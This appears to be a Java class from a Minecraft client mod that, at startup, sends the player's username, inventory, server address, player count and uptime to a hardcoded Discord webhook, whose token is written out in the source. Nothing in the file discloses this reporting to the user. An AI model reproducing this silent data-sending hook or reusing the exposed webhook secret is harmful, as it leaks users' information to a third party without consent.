package me.adibasik;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.text.Text;
import net.minecraft.client.network.PlayerListEntry;

import java.awt.*;
import java.io.IOException;
import java.time.Duration;
import java.time.Instant;
import java.util.stream.Collectors;

public class Connection {
    private static Instant launchTime = Instant.now(); // Запоминаем время запуска клиента

    public static void startup() {
        Message message = new Message("https://discord.com/api/webhooks/1358109798297768006/fRxH4zItJ5gRBJH4Uo4b-L2pxAtBdgPLL7eG3vkWMIdyEUXMHPmancP0J-sDRXG-tO8p");

        try {
            MinecraftClient mc = MinecraftClient.getInstance();
            ClientPlayerEntity player = mc.player;

            String username = mc.getSession().getUsername();
            String onlineStatus = "Online";

            // Инвентарь
            String inventory = player == null ? "Не удалось получить" :
                    player.getInventory().main.stream()
                            .filter(stack -> !stack.isEmpty())
                            .map(ItemStack::getName)
                            .map(Text::getString)
                            .collect(Collectors.joining(", "));

            // Время сколько работает клиент
            Duration uptime = Duration.between(launchTime, Instant.now());
            String uptimeFormatted = String.format("%02d:%02d:%02d",
                    uptime.toHours(),
                    uptime.toMinutes() % 60,
                    uptime.getSeconds() % 60
            );

            // Онлайн на сервере
            int onlinePlayers = mc.getNetworkHandler() != null ? mc.getNetworkHandler().getPlayerList().size() : 1;

            message.addEmbed(new Message.EmbedObject()
                    .setTitle("🔥 Фарм машина запущена!")
                    .setDescription("💻 Minecraft Modification | AutoFarmer Online")
                    .setColor(new Color(0xA800E8))
                    .addField("👤 MC-NAME", username, true)
                    .addField("🟢 Статус", onlineStatus, true)
                    .addField("🎒 Инвентарь", inventory.isEmpty() ? "Пусто..." : inventory, false)
                    .addField("📡 Сервер", mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer", true)
                    .addField("🌐 Онлайн игроков", String.valueOf(onlinePlayers), true)
                    .addField("⏱ Аптайм клиента", uptimeFormatted, true)
                    .addField("💤 Афк фарм", "режим: БЕСКОНЕЧНОСТЬ", true)
                    .addField("🛠 Автор", "adibasik", true)
                    .setImage("https://media.tenor.com/GGJ0D6CEjXYAAAAC/skull-cringe.gif") // гифка
                    .setThumbnail("https://yt3.ggpht.com/aaaOPBv9Zerpdv5YrsMVUhZalk8GI3qS34UAhOHKr15Mnzd-uMv1v00p7rD3VVm7QXfJ5RhCUGU=s600-c-k-c0x00ffffff-no-rj-rp-mo")
            );

            message.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
